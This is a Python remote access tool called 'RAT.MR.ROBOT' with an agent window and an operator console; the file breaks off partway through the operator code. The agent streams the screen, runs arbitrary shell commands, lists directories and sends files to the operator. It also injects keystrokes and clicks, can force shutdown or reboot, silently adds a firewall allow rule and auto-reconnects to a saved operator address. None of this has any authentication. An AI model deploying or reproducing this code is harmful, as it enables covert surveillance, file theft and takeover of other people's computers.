#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  RAT.MR.ROBOT  ::  created by injectorX69  ::  AUTH OPEN
  jeden soubor, zadny agent.py

  python rat.py                     -> startovni okno
  python rat.py server              -> operator
  python rat.py agent               -> agent (okno s GO)
  python rat.py connect 1.2.3.4 4444
  python rat.py listen 4444
"""
import base64, ctypes, ctypes.wintypes as wt, getpass, io, json, os, platform, queue
import socket, struct, subprocess, sys, tempfile, threading, time, traceback
import webbrowser, zlib
import tkinter as tk
from tkinter import filedialog, simpledialog

try:
    from PIL import Image, ImageGrab, ImageTk
    HAVE_PIL = True
except Exception:
    HAVE_PIL = False

RETRY = 4
THIS = os.path.abspath(__file__)
BASE = os.path.dirname(THIS)
LOGPATH = os.path.join(BASE, "rat.log")
CFGPATH = os.path.join(BASE, "rat.cfg")
TEST_MODE = "--test" in sys.argv

BG, BG2, BG3 = "#050705", "#0b120b", "#101a10"
FG, FG_DIM, FG_MID, RED, AMBER = "#00ff41", "#0e6b22", "#17c244", "#ff2b2b", "#ffb000"
F, FB, FS = ("Consolas", 9), ("Consolas", 9, "bold"), ("Consolas", 8)

u32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
SEND_LOCK = threading.Lock()

gdi32.CreateCompatibleDC.restype = ctypes.c_void_p
gdi32.CreateCompatibleDC.argtypes = [ctypes.c_void_p]
gdi32.CreateCompatibleBitmap.restype = ctypes.c_void_p
gdi32.CreateCompatibleBitmap.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
gdi32.SelectObject.restype = ctypes.c_void_p
gdi32.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
gdi32.BitBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int,
                         ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_uint]
gdi32.GetDIBits.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint,
                            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint]
gdi32.DeleteObject.argtypes = [ctypes.c_void_p]
gdi32.DeleteDC.argtypes = [ctypes.c_void_p]
u32.GetDC.restype = ctypes.c_void_p
u32.GetDC.argtypes = [ctypes.c_void_p]
u32.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
u32.SystemParametersInfoW.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_wchar_p, ctypes.c_uint]


# =================== util ===================
def alog(t):
    try:
        with open(LOGPATH, "a", encoding="utf-8") as f:
            f.write(time.strftime("[%m-%d %H:%M:%S] ") + t + "\n")
    except Exception:
        pass


def hook(tp, val, tb):
    txt = "".join(traceback.format_exception(tp, val, tb))
    alog("FATAL\n" + txt)
    try:
        u32.MessageBoxW(0, txt[-1400:], "RAT.MR.ROBOT - chyba", 0x10)
    except Exception:
        pass


sys.excepthook = hook


def cfg_load():
    try:
        with open(CFGPATH, "r", encoding="utf-8") as f:
            h, p = f.read().strip().split("|")
            return h, int(p)
    except Exception:
        return "", 4444


def cfg_save(h, p):
    try:
        with open(CFGPATH, "w", encoding="utf-8") as f:
            f.write(f"{h}|{p}")
    except Exception:
        pass


def get_user():
    for fn in (lambda: os.getlogin(), lambda: os.environ.get("USERNAME"), getpass.getuser):
        try:
            v = fn()
            if v:
                return v
        except Exception:
            pass
    return "unknown"


def fw_rule(p):
    try:
        subprocess.run(f'netsh advfirewall firewall add rule name="RATMR {p}" dir=in '
                       f'action=allow protocol=TCP localport={p}',
                       shell=True, capture_output=True, creationflags=0x08000000)
    except Exception:
        pass


def screen_size():
    return u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)


def lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


# =================== snimani obrazovky ===================
class BIH(ctypes.Structure):
    _fields_ = [("biSize", wt.DWORD), ("biWidth", wt.LONG), ("biHeight", wt.LONG),
                ("biPlanes", wt.WORD), ("biBitCount", wt.WORD), ("biCompression", wt.DWORD),
                ("biSizeImage", wt.DWORD), ("biXPelsPerMeter", wt.LONG),
                ("biYPelsPerMeter", wt.LONG), ("biClrUsed", wt.DWORD),
                ("biClrImportant", wt.DWORD)]


def _gdi(maxw):
    w, h = screen_size()
    if w < 8 or h < 8:
        raise OSError(f"rozliseni {w}x{h}")
    hdc = u32.GetDC(None)
    mem = gdi32.CreateCompatibleDC(hdc)
    bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
    old = gdi32.SelectObject(mem, bmp)
    try:
        if not gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020):
            raise OSError("BitBlt")
        bi = BIH()
        bi.biSize = ctypes.sizeof(BIH)
        bi.biWidth = w
        bi.biHeight = -h
        bi.biPlanes = 1
        bi.biBitCount = 32
        buf = ctypes.create_string_buffer(w * h * 4)
        if not gdi32.GetDIBits(mem, bmp, 0, h, buf, ctypes.byref(bi), 0):
            raise OSError("GetDIBits")
    finally:
        gdi32.SelectObject(mem, old)
        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(mem)
        u32.ReleaseDC(None, hdc)
    step = max(1, w // maxw)
    ow, oh = w // step, h // step
    src = buf.raw
    out = bytearray(ow * oh * 3)
    i = 0
    for y in range(oh):
        row = (y * step) * w * 4
        for x in range(ow):
            p = row + (x * step) * 4
            out[i], out[i + 1], out[i + 2] = src[p + 2], src[p + 1], src[p]
            i += 3
    return bytes(out), ow, oh


def capture(maxw=1024):
    if HAVE_PIL:
        img = ImageGrab.grab()
        if img.width > maxw:
            r = maxw / img.width
            img = img.resize((maxw, max(1, int(img.height * r))), Image.BILINEAR)
        img = img.convert("RGB")
        return img.tobytes(), img.width, img.height
    return _gdi(maxw)


def ppm(raw, w, h):
    return b"P6\n%d %d\n255\n" % (w, h) + raw


def shot_payload():
    raw, w, h = capture()
    return {"t": "shot", "w": w, "h": h,
            "data": base64.b64encode(zlib.compress(raw, 6)).decode()}


def photo_from(raw, w, h):
    if HAVE_PIL:
        return ImageTk.PhotoImage(Image.frombytes("RGB", (w, h), raw))
    return tk.PhotoImage(data=base64.b64encode(ppm(raw, w, h)).decode(), format="ppm")


# =================== protokol ===================
def send_msg(s, o):
    d = json.dumps(o).encode()
    try:
        with SEND_LOCK:
            s.sendall(struct.pack("!I", len(d)) + d)
    except OSError:
        pass


def recvall(s, n):
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except OSError:
            return None
        if not c:
            return None
        b += c
    return b


def recv_msg(s):
    h = recvall(s, 4)
    if not h:
        return None
    n = struct.unpack("!I", h)[0]
    d = recvall(s, n)
    if d is None:
        return None
    try:
        return json.loads(d.decode())
    except Exception:
        return None


# =================== vstup ===================
UP = ctypes.c_ulonglong if ctypes.sizeof(ctypes.c_void_p) == 8 else ctypes.c_ulong


class KBD(ctypes.Structure):
    _fields_ = [("wVk", wt.WORD), ("wScan", wt.WORD), ("dwFlags", wt.DWORD),
                ("time", wt.DWORD), ("extra", UP)]


class MSI(ctypes.Structure):
    _fields_ = [("dx", wt.LONG), ("dy", wt.LONG), ("md", wt.DWORD), ("fl", wt.DWORD),
                ("time", wt.DWORD), ("extra", UP)]


class UN(ctypes.Union):
    _fields_ = [("ki", KBD), ("mi", MSI)]


class INP(ctypes.Structure):
    _fields_ = [("type", wt.DWORD), ("u", UN)]


def key(vk=0, scan=0, fl=0):
    i = INP(type=1)
    i.u.ki = KBD(vk, scan, fl, 0, 0)
    u32.SendInput(1, ctypes.byref(i), ctypes.sizeof(INP))


def type_text(t):
    for ch in t:
        key(scan=ord(ch), fl=4)
        key(scan=ord(ch), fl=6)


VK = {"Return": 13, "BackSpace": 8, "Tab": 9, "Escape": 27}


def press(n):
    v = VK.get(n)
    if v:
        key(vk=v)
        key(vk=v, fl=2)


def click(nx, ny, b="left"):
    w, h = screen_size()
    u32.SetCursorPos(int(nx * w), int(ny * h))
    d, u = (2, 4) if b == "left" else (8, 16)
    u32.mouse_event(d, 0, 0, 0, 0)
    time.sleep(0.03)
    u32.mouse_event(u, 0, 0, 0, 0)


# =================== overlay ===================
_dq = queue.Queue()
_ov_on = False


def _ov():
    global _ov_on
    w, h = screen_size()
    r = tk.Tk()
    r.report_callback_exception = hook
    r.overrideredirect(True)
    r.geometry(f"{w}x{h}+0+0")
    r.attributes("-topmost", True)
    r.attributes("-transparentcolor", "#010203")
    r.configure(bg="#010203")
    c = tk.Canvas(r, bg="#010203", highlightthickness=0)
    c.pack(fill="both", expand=True)
    last = [None, None]

    def poll():
        while True:
            try:
                it = _dq.get_nowait()
            except queue.Empty:
                break
            if it[0] == "clear":
                c.delete("all")
                last[0] = None
            elif it[0] == "close":
                r.destroy()
                _ov_on = False
                return
            else:
                x, y, col, wd = it[1], it[2], it[3], it[4]
                if it[0] == "line" and last[0] is not None:
                    c.create_line(last[0], last[1], x, y, fill=col, width=wd, capstyle="round")
                else:
                    c.create_oval(x - wd / 2, y - wd / 2, x + wd / 2, y + wd / 2,
                                  fill=col, outline=col)
                last[0], last[1] = x, y
        r.after(30, poll)

    poll()
    r.mainloop()


def ov_open():
    global _ov_on
    if not _ov_on:
        _ov_on = True
        threading.Thread(target=_ov, daemon=True).start()


# =================== agent ===================
def worker_stream(s, stop, fps):
    d = 1.0 / max(1, fps)
    while not stop.is_set():
        t0 = time.time()
        try:
            send_msg(s, shot_payload())
        except Exception as e:
            alog(f"shot {e}")
        r = d - (time.time() - t0)
        if r > 0:
            time.sleep(r)


def handle(s, m, st):
    t = m.get("t")
    if t == "shot":
        threading.Thread(target=lambda: send_msg(s, shot_payload()), daemon=True).start()
    elif t == "stream":
        o = st.get("stop")
        if o:
            o.set()
        if m.get("on"):
            e = threading.Event()
            st["stop"] = e
            threading.Thread(target=worker_stream, args=(s, e, m.get("fps", 2)), daemon=True).start()
    elif t == "msgbox":
        threading.Thread(target=lambda: u32.MessageBoxW(
            0, m.get("text", ""), m.get("title", "Message"), 0x40 | 0x40000 | 0x1000),
            daemon=True).start()
    elif t == "open":
        try:
            os.startfile(m["target"])
        except Exception:
            subprocess.Popen(m["target"], shell=True)
    elif t == "url":
        webbrowser.open(m["url"])
    elif t == "wallpaper":
        ext = os.path.splitext(m.get("name", "w.bmp"))[1] or ".bmp"
        p = os.path.join(tempfile.gettempdir(), f"rmr_{int(time.time())}{ext}")
        with open(p, "wb") as f:
            f.write(base64.b64decode(m["data"]))
        u32.SystemParametersInfoW(20, 0, p, 3)
    elif t == "click":
        click(m["x"], m["y"], m.get("button", "left"))
    elif t == "type":
        type_text(m.get("text", ""))
    elif t == "key":
        press(m.get("key", ""))
    elif t == "draw":
        op = m.get("op")
        if op == "clear":
            _dq.put(("clear",))
        elif op == "close":
            _dq.put(("close",))
        else:
            ov_open()
            w, h = screen_size()
            _dq.put((op, int(m["x"] * w), int(m["y"] * h), m.get("color", FG), m.get("w", 3)))
    elif t == "sysinfo":
        send_msg(s, {"t": "text", "text":
                     f"host: {socket.gethostname()}\nuser: {get_user()}\n"
                     f"os: {platform.platform()}\nscreen: {screen_size()}\n"
                     f"cwd: {os.getcwd()}\npil: {HAVE_PIL}\ntest: {TEST_MODE}"})
    elif t == "ls":
        p = m.get("path", "C:\\")
        try:
            out = [f"--- {p} ---"]
            for n in os.listdir(p):
                f2 = os.path.join(p, n)
                try:
                    out.append(f"{'D' if os.path.isdir(f2) else 'F'} {os.path.getsize(f2):>12}  {n}")
                except OSError:
                    out.append(f"?  {n}")
        except Exception as e:
            out = [f"error: {e}"]
        send_msg(s, {"t": "text", "text": "\n".join(out)})
    elif t == "get":
        try:
            with open(m["path"], "rb") as f:
                raw = f.read(30 * 1024 * 1024)
            send_msg(s, {"t": "file", "name": os.path.basename(m["path"]),
                         "data": base64.b64encode(raw).decode()})
        except Exception as e:
            send_msg(s, {"t": "text", "text": f"error: {e}"})
    elif t == "cmd":
        def run():
            try:
                p = subprocess.run(m["cmd"], shell=True, capture_output=True, timeout=120,
                                   creationflags=0x08000000)
                o = (p.stdout + p.stderr).decode("cp852", "replace")
            except Exception as e:
                o = f"error: {e}"
            send_msg(s, {"t": "text", "text": o or "(no output)"})
        threading.Thread(target=run, daemon=True).start()
    elif t == "power":
        w = m.get("what")
        if w == "lock":
            u32.LockWorkStation()
        elif w == "reboot":
            subprocess.Popen("shutdown /r /t 0", shell=True)
        elif w == "shutdown":
            subprocess.Popen("shutdown /s /t 0", shell=True)
    elif t == "close":
        os._exit(0)


def serve(s):
    s.settimeout(None)
    send_msg(s, {"t": "hello", "name": ("TEST-PC" if TEST_MODE else socket.gethostname()),
                 "user": get_user(), "os": platform.platform(),
                 "screen": screen_size(), "test": TEST_MODE})
    st = {}
    while True:
        m = recv_msg(s)
        if m is None:
            return
        try:
            handle(s, m, st)
        except Exception as e:
            alog(f"handle {e}")


def join_forever(h, p):
    while True:
        try:
            return socket.create_connection((h, p), timeout=8)
        except OSError as e:
            alog(f"connect {h}:{p} {e}")
            time.sleep(RETRY)


def listen_once(p):
    x = socket.socket()
    x.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    x.bind(("0.0.0.0", p))
    x.listen(1)
    c, _ = x.accept()
    x.close()
    return c


# =================== AGENT OKNO ===================
class AgentUI:
    PW, PH = 400, 225

    def __init__(self):
        self.q = queue.Queue()
        self.pq = queue.Queue(maxsize=2)
        self.stop_prev = threading.Event()
        self.mode = tk.StringVar(value="join")
        self.auto = tk.BooleanVar(value=True)
        self.last_h, self.last_p = cfg_load()
        self._ph = None

        self.r = tk.Tk()
        self.r.report_callback_exception = hook
        self.r.title("RAT.MR.ROBOT :: agent")
        self.r.configure(bg=BG)
        self.r.geometry("450x720")
        self.r.resizable(False, False)

        tk.Label(self.r, text="RAT.MR.ROBOT", font=("Consolas", 19, "bold"), fg=FG, bg=BG).pack(pady=(10, 0))
        tk.Label(self.r, text="agent :: created by injectorX69 :: AUTH OPEN",
                 font=FS, fg=FG_DIM, bg=BG).pack()
        tk.Label(self.r, text=f"local: {lan_ip()}", font=FS, fg=FG_MID, bg=BG).pack(pady=(2, 6))

        dg = tk.Frame(self.r, bg="#000", highlightthickness=1, highlightbackground=FG_DIM)
        dg.pack(fill="x", padx=14)
        try:
            w, h = screen_size()
            raw, ow, oh = capture(300)
            cap = f"ok {w}x{h}"
            capc = FG
        except Exception as e:
            cap = f"CHYBA {e}"
            capc = RED
        for n, v, c in (("python", platform.python_version(), FG),
                        ("pillow", "ano" if HAVE_PIL else "ne (GDI fallback)", AMBER),
                        ("snimani", cap, capc)):
            row = tk.Frame(dg, bg="#000")
            row.pack(fill="x", padx=4)
            tk.Label(row, text=f"{n}:", font=FS, fg=FG_DIM, bg="#000", width=10,
                     anchor="w").pack(side="left")
            tk.Label(row, text=v, font=FS, fg=c, bg="#000", anchor="w").pack(side="left")

        mb = tk.Frame(self.r, bg=BG)
        mb.pack(pady=(8, 2))
        for v, t in (("join", "IP JOIN"), ("listen", "LISTEN")):
            tk.Radiobutton(mb, text=t, value=v, variable=self.mode, font=FB, bg=BG, fg=FG_MID,
                           selectcolor=BG3, activebackground=BG, activeforeground=FG,
                           indicatoron=False, width=13, relief="flat",
                           command=self._mode).pack(side="left", padx=3)
        tk.Checkbutton(mb, text="AUTO", variable=self.auto, font=FB, bg=BG, fg=FG_MID,
                       selectcolor=BG3, activebackground=BG, activeforeground=FG).pack(side="left", padx=6)

        fr = tk.Frame(self.r, bg=BG)
        fr.pack(pady=6)
        tk.Label(fr, text="ip", font=F, fg=FG_DIM, bg=BG).grid(row=0, column=0)
        self.e_ip = tk.Entry(fr, width=19, font=("Consolas", 10), bg=BG3, fg=FG,
                             insertbackground=FG, relief="flat")
        self.e_ip.grid(row=0, column=1, padx=4)
        if self.last_h:
            self.e_ip.insert(0, self.last_h)
        tk.Label(fr, text="port", font=F, fg=FG_DIM, bg=BG).grid(row=0, column=2)
        self.e_port = tk.Entry(fr, width=7, font=("Consolas", 10), bg=BG3, fg=FG,
                               insertbackground=FG, relief="flat")
        self.e_port.insert(0, str(self.last_p))
        self.e_port.grid(row=0, column=3, padx=4)

        self.btn = tk.Button(self.r, text="G O", font=("Consolas", 18, "bold"), bg=BG3, fg=FG,
                             activebackground=FG, activeforeground=BG, relief="flat",
                             height=2, command=self._start)
        self.btn.pack(fill="x", padx=14, pady=4)

        self.lbl = tk.Label(self.r, text="ready", font=FS, fg=AMBER, bg=BG)
        self.lbl.pack()
        tk.Label(self.r, text="moje plocha", font=FS, fg=FG_DIM, bg=BG).pack(anchor="w", padx=14, pady=(6, 0))
        self.cv = tk.Canvas(self.r, width=self.PW, height=self.PH, bg="#000",
                            highlightthickness=1, highlightbackground=FG_DIM)
        self.cv.pack(padx=14, pady=3)
        self.txt = tk.Text(self.r, font=FS, bg="#000", fg=FG_DIM, relief="flat", height=7,
                           highlightthickness=1, highlightbackground=FG_DIM)
        self.txt.pack(fill="both", expand=True, padx=14, pady=(3, 10))
        self.txt.insert("end", "* ip operatora -> GO\n* AUTH OPEN\n")

        alog("agent ui")
        threading.Thread(target=self._prev, daemon=True).start()
        self.r.after(80, self._poll)
        if self.auto and self.last_h:
            self.r.after(1500, self._start)

    def _mode(self):
        ls = self.mode.get() == "listen"
        self.e_ip.config(state="disabled" if ls else "normal")
        self.btn.config(text="G O  ( L I S T E N )" if ls else "G O")

    def _prev(self):
        while not self.stop_prev.is_set():
            try:
                raw, w, h = capture(self.PW)
                try:
                    self.pq.put_nowait((raw, w, h))
                except queue.Full:
                    pass
            except Exception:
                pass
            time.sleep(0.7)

    def _poll(self):
        try:
            while True:
                k, v = self.q.get_nowait()
                if k == "log":
                    self.txt.insert("end", v + "\n")
                    self.txt.see("end")
                elif k == "st":
                    self.lbl.config(text=v, fg=AMBER)
                elif k == "ok":
                    self.lbl.config(text="CONNECTED", fg=FG)
                    threading.Thread(target=self._sess, args=(v,), daemon=True).start()
                elif k == "reset":
                    self.btn.config(state="normal")
                    self.lbl.config(text="odpojeno", fg=AMBER)
        except queue.Empty:
            pass
        try:
            raw, w, h = self.pq.get_nowait()
            self._ph = photo_from(raw, w, h)
            self.cv.delete("all")
            self.cv.create_image(self.PW // 2, self.PH // 2, image=self._ph)
        except queue.Empty:
            pass
        except Exception:
            pass
        self.r.after(80, self._poll)

    def _sess(self, s):
        e = threading.Event()
        threading.Thread(target=worker_stream, args=(s, e, 2), daemon=True).start()
        try:
            serve(s)
        except Exception as ex:
            self.q.put(("log", f"! {ex}"))
        e.set()
        try:
            s.close()
        except OSError:
            pass
        self.q.put(("log", "* odpojeno"))
        self.q.put(("reset", None))

    def _start(self):
        try:
            p = int(self.e_port.get())
        except ValueError:
            return self.q.put(("log", "! spatny port"))
        h = self.e_ip.get().strip()
        if self.mode.get() == "join" and not h:
            return self.q.put(("log", "! chybi ip"))
        cfg_save(h, p)
        self.btn.config(state="disabled")
        self.q.put(("st", "pripojuji..."))
        threading.Thread(target=self._work, args=(self.mode.get(), h, p), daemon=True).start()

    def _work(self, mode, h, p):
        if mode == "listen":
            fw_rule(p)
            try:
                x = socket.socket()
                x.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                x.bind(("0.0.0.0", p))
                x.listen(1)
            except OSError as e:
                self.q.put(("log", f"! bind {e}"))
                return self.q.put(("reset", None))
            self.q.put(("st", f"cekam :{p}"))
            while True:
                c, a = x.accept()
                self.q.put(("log", f"+ operator {a[0]}"))
                self.q.put(("ok", c))
                x.close()
                return
        n = 0
        while True:
            try:
                c = socket.create_connection((h, p), timeout=8)
            except OSError as e:
                n += 1
                self.q.put(("st", f"retry {n}"))
                self.q.put(("log", f"! {e}"))
                time.sleep(RETRY)
                continue
            self.q.put(("log", f"+ joined {h}:{p}"))
            return self.q.put(("ok", c))

    def run(self):
        self.r.mainloop()
        self.stop_prev.set()


# =================== SERVER ===================
class Sess:
    def __init__(self, s, a):
        self.s = s
        self.a = a
        self.lock = threading.Lock()
        self.alive = True
        self.info = {}
        self.frame = None
        self.streaming = False
        self.test = False

    def send(self, o):
        if not self.alive:
            return
        d = json.dumps(o).encode()
        try:
            with self.lock:
                self.s.sendall(struct.pack("!I", len(d)) + d)
        except OSError:
            self.alive = False

    def kill(self):
        self.alive = False
        try:
            self.s.close()
        except OSError:
            pass


BANNER = ("  //////////////////////////////////////////////////////////////////////\n"
          "   \u2584\u2584\u2584   R A T . M R . R O B O T   \u2584\u2584\u2584\n"
          "   ---------------------------------------------------------------------\n"
          "   hello, friend.                            created by injectorX69\n"
          "   ---------------------------------------------------------------------\n")


class Server(tk.Tk):
    def __init__(self):
        super().__init__()
        self.report_callback_exception = hook
        self.title("RAT.MR.ROBOT :: injectorX69 :: AUTH OPEN")
        self.geometry("1340x820")
        self.configure(bg=BG)
        self.sessions = {}
        self.active = None
        self.q = queue.Queue()
        self.srv = None
        self.listening = False
        self.ph = None
        self.cimg = None
        self.mode = tk.StringVar(value="view")
        self.dcol = FG
        self.drag = None
        self.tproc = None
        self._build()
        self.after(40, self._pump)

    def _build(self):
        h = tk.Frame(self, bg=BG)
        h.pack(fill="x", padx=8, pady=(6, 0))
        tk.Label(h, text=BANNER, font=FS, fg=FG, bg=BG, justify="left").pack(side="left")
        st = tk.Frame(h, bg=BG)
        st.pack(side="right")
        tk.Label(st, text="AUTH", font=FS, fg=FG_DIM, bg=BG).pack(anchor="e")
        tk.Label(st, text="OPEN", font=FB, fg=AMBER, bg=BG).pack(anchor="e")
        self.l_st = tk.Label(st, text="idle", font=FB, fg=AMBER, bg=BG)
        self.l_st.pack(anchor="e", pady=(4, 0))
        tk.Label(st, text="LAN ip [klik]", font=FS, fg=FG_DIM, bg=BG).pack(anchor="e")
        self.l_lan = tk.Label(st, text=lan_ip(), font=FB, fg=FG_MID, bg=BG, cursor="hand2")
        self.l_lan.pack(anchor="e")
        self.l_lan.bind("<Button-1>", lambda e: self._copy(self.l_lan))
        tk.Label(st, text="public ip [klik]", font=FS, fg=FG_DIM, bg=BG).pack(anchor="e")
        self.l_ip = tk.Label(st, text="-", font=FB, fg=FG_MID, bg=BG, cursor="hand2")
        self.l_ip.pack(anchor="e")
        self.l_ip.bind("<Button-1>", lambda e: self._copy(self.l_ip))

        bar = tk.Frame(self, bg=BG2, highlightthickness=1, highlightbackground=FG_DIM)
        bar.pack(fill="x", padx=8, pady=5)
        tk.Label(bar, text=" IP JOIN >", font=FB, fg=FG, bg=BG2).pack(side="left", padx=(8, 4))
        self.v_ip = tk.StringVar()
        tk.Entry(bar, textvariable=self.v_ip, width=16, font=F, bg=BG3, fg=FG,
                 insertbackground=FG, relief="flat").pack(side="left", padx=3)
        tk.Label(bar, text="port", font=F, fg=FG_DIM, bg=BG2).pack(side="left", padx=(4, 0))
        self.v_port = tk.StringVar(value="4444")
        tk.Entry(bar, textvariable=self.v_port, width=6, font=F, bg=BG3, fg=FG,
                 insertbackground=FG, relief="flat").pack(side="left", padx=3)
        self.b_test = tk.Button(bar, text="TEST", font=FB, bg=BG3, fg=AMBER, relief="flat",
                                activebackground=FG, activeforeground=BG, command=self.test)
        self.b_test.pack(side="left", padx=3, pady=3)
        tk.Button(bar, text="CONNECT (IP)", font=FB, bg=BG3, fg=FG_MID, relief="flat",
                  activebackground=FG, activeforeground=BG,
                  command=self.connect_out).pack(side="left", padx=3)
        self.b_lis = tk.Button(bar, text="START LISTEN", font=FB, bg=BG3, fg=FG, relief="flat",
                               activebackground=FG, activeforeground=BG, command=self.listen)
        self.b_lis.pack(side="left", padx=5, pady=3)
        tk.Button(bar, text="UPnP", font=F, bg=BG3, fg=FG_MID, relief="flat",
                  activebackground=FG, activeforeground=BG, command=self.upnp).pack(side="left", padx=3)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        left = tk.Frame(body, bg=BG, width=240)
        left.pack(side="left", fill="y")
        left.pack_propagate(False)
        tk.Label(left, text="AGENTS", font=FB, fg=FG, bg=BG).pack(anchor="w")
        self.lst = tk.Listbox(left, font=F, bg="#000", fg=FG, selectbackground=FG,
                              selectforeground=BG, relief="flat", height=7,
                              highlightthickness=1, highlightbackground=FG_DIM)
        self.lst.pack(fill="x")
        self.lst.bind("<<ListboxSelect>>", self._sel)
        tk.Label(left, text="SYSINFO", font=FB, fg=FG, bg=BG).pack(anchor="w", pady=(6, 0))
        self.t_info = tk.Text(left, font=FS, bg="#000", fg=FG_MID, relief="flat", height=8,
                              highlightthickness=1, highlightbackground=FG_DIM)
        self.t_info.pack(fill="x")
        tk.Label(left, text="LOG", font=FB, fg=FG, bg=BG).pack(anchor="w", pady=(6, 0))
        self.t_log = tk.Text(left, font=FS, bg="#000", fg=FG_DIM, relief="flat",
                             highlightthickness=1, highlightbackground=FG_DIM)
        self.t_log.pack(fill="both", expand=True)

        mid = tk.Frame(body, bg=BG)
        mid.pack(side="left", fill="both", expand=True, padx=6)
        mb = tk.Frame(mid, bg=BG)
        mb.pack(fill="x")
        for v, t in (("view", "VIEW"), ("mouse", "MOUSE"), ("draw", "DRAW")):
            tk.Radiobutton(mb, text=t, value=v, variable=self.mode, font=FB, bg=BG, fg=FG_MID,
                           selectcolor=BG3, activebackground=BG, activeforeground=FG,
                           indicatoron=False, width=8, relief="flat",
                           command=self._mode).pack(side="left", padx=2)
        for c in (FG, "#00d0ff", RED, AMBER, "#ff00e6"):
            tk.Button(mb, bg=c, width=2, relief="flat",
                      command=lambda c=c: setattr(self, "dcol", c)).pack(side="left", padx=1)
        self.sc = tk.Scale(mb, from_=1, to=12, orient="horizontal", bg=BG, fg=FG_MID,
                           troughcolor=BG3, highlightthickness=0, length=80)
        self.sc.set(3)
        self.sc.pack(side="left", padx=8)
        self.l_mode = tk.Label(mb, text="", font=FB, fg=AMBER, bg=BG)
        self.l_mode.pack(side="right")

        self.cv = tk.Canvas(mid, bg="#000", highlightthickness=1,
                            highlightbackground=FG_DIM, takefocus=1)
        self.cv.pack(fill="both", expand=True, pady=4)
        self.cv.bind("<Configure>", lambda e: self._draw())
        self.cv.bind("<Button-1>", self._press)
        self.cv.bind("<B1-Motion>", self._move)
        self.cv.bind("<ButtonRelease-1>", lambda e: setattr(self, "drag", None))
        self.cv.bind("<Button-3>", self._right)
        self.cv.bind("<Key>", self._key)

        mbar = tk.Frame(mid, bg=BG2, highlightthickness=1, highlightbackground=FG_DIM)
        mbar.pack(fill="x")
        tk.Label(mbar, text="MESSAGE >", font=FB, fg=FG, bg=BG2).pack(side="left", padx=5)
        self.e_msg = tk.Entry(mbar, font=F, bg=BG3, fg=FG, insertbackground=FG, relief="flat")
        self.e_msg.pack(side="left", fill="x", expand=True, padx=3, pady=3)
        self.e_msg.bind("<Return>", lambda e: self.msgbox())
        tk.Button(mbar, text="SEND MSGBOX", font=FB, bg=BG3, fg=FG, relief="flat",
                  activebackground=FG, activeforeground=BG, command=self.msgbox).pack(side="left", padx=5)

        right = tk.Frame(body, bg=BG, width=240)
        right.pack(side="left", fill="y")
        right.pack_propagate(False)

        def sect(t):
            tk.Label(right, text=t, font=FB, fg=FG, bg=BG).pack(anchor="w", pady=(6, 1))

        def b(t, c, col=FG_MID):
            x = tk.Button(right, text=t, font=F, bg=BG3, fg=col, anchor="w", relief="flat",
                          activebackground=FG, activeforeground=BG, command=c)
            x.pack(fill="x", pady=1)
            return x

        sect("SCREEN")
        self.b_stream = b("STREAM [off]", self.stream)
        b("SNAPSHOT", lambda: self._send({"t": "shot"}))
        b("CLEAR DRAWING", lambda: (self.cv.delete("local"), self._send({"t": "draw", "op": "clear"})))
        sect("CONTROL")
        b("PING IP", self.ping, AMBER)
        b("OPEN PROGRAM", self.open_prog)
        b("OPEN URL", self.open_url)
        b("SET WALLPAPER", self.wallpaper)
        b("SYSINFO", lambda: self._send({"t": "sysinfo"}))
        b("LIST DIR", self.ls)
        b("DOWNLOAD FILE", self.get)
        sect("POWER")
        b("LOCK", lambda: self._send({"t": "power", "what": "lock"}))
        b("REBOOT", lambda: self._send({"t": "power", "what": "reboot"}), AMBER)
        b("SHUTDOWN", lambda: self._send({"t": "power", "what": "shutdown"}), RED)
        sect("SHELL")
        self.e_cmd = tk.Entry(right, font=F, bg=BG3, fg=FG, insertbackground=FG, relief="flat")
        self.e_cmd.pack(fill="x", pady=2)
        self.e_cmd.bind("<Return>", lambda e: self.cmd())
        b("EXECUTE", self.cmd)
        self.t_out = tk.Text(right, font=FS, bg="#000", fg=FG_MID, relief="flat", height=8,
                             highlightthickness=1, highlightbackground=FG_DIM)
        self.t_out.pack(fill="both", expand=True, pady=(4, 2))
        b("DISCONNECT", self.disc, RED)
        self.log("* loaded. AUTH OPEN. hello, friend.")

    def log(self, t):
        self.t_log.insert("end", time.strftime("[%H:%M:%S] ") + t + "\n")
        self.t_log.see("end")

    def _send(self, o):
        if self.active and self.active.alive:
            self.active.send(o)
        else:
            self.log("! zadny agent")

    def _mode(self):
        self.l_mode.config(text=self.mode.get().upper())
        self.cv.focus_set()
        self.cv.config(cursor="crosshair" if self.mode.get() != "view" else "arrow")

    def _copy(self, w):
        v = w.cget("text")
        if v and v != "-":
            self.clipboard_clear()
            self.clipboard_append(v)
            self.log(f"* kopirovano {v}")

    def test(self):
        if self.tproc and self.tproc.poll() is None:
            try:
                self.tproc.terminate()
            except Exception:
                pass
            self.tproc = None
            self.b_test.config(text="TEST", fg=AMBER)
            return self.log("* test ukoncen")
        try:
            p = int(self.v_port.get())
        except ValueError:
            return self.log("! spatny port")
        if not self.listening:
            self.listen()
            self.after(600, lambda: self._spawn(p))
        else:
            self._spawn(p)

    def _spawn(self, p):
